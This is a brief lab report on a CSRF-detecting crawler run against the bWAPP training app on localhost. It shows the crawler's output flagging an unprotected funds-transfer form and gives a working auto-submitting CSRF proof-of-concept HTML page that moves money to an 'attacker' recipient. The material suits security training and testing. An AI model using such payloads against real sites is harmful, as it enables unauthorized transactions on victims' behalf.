REPORT ON CSRF CRAWLER AND VULNERABILITY

I have included the script and the PoC file in the repository.

The output of the script was:
[!] CSRF Token Missing at http://localhost/bWAPP/transfer_funds.php
Form:
<form action="transfer_funds.php" method="post">
  <label>Amount:</label><input type="text" name="amount" />
  <label>Recipient:</label><input type="text" name="recipient" />
  <input type="submit" value="Transfer" />
</form>

What Does the Output Mean?
The script flagged a form at http://localhost/bWAPP/transfer_funds.php as "CSRF Token Missing".
This indicates that the form likely does not have any CSRF protection.

How to Improve the Script
The script currently looks for hidden inputs whose names contain "csrf".
In some cases, the token might be called something different (e.g., "auth_token" or "nonce").
To improve detection, update the script to look for these other keywords too.

How to Build Your CSRF PoC HTML
Because no CSRF token is present, you can simply create a form with the required fields and submit it automatically.

Example:

<form action="http://localhost/bWAPP/transfer_funds.php" method="POST" id="csrfForm">
  <input type="hidden" name="amount" value="9999">
  <input type="hidden" name="recipient" value="attacker">
</form>

<script>
  document.getElementById('csrfForm').submit();
</script>

Summary
The script successfully detected a form without CSRF protection.
A PoC has been prepared to demonstrate an unauthorized fund transfer.
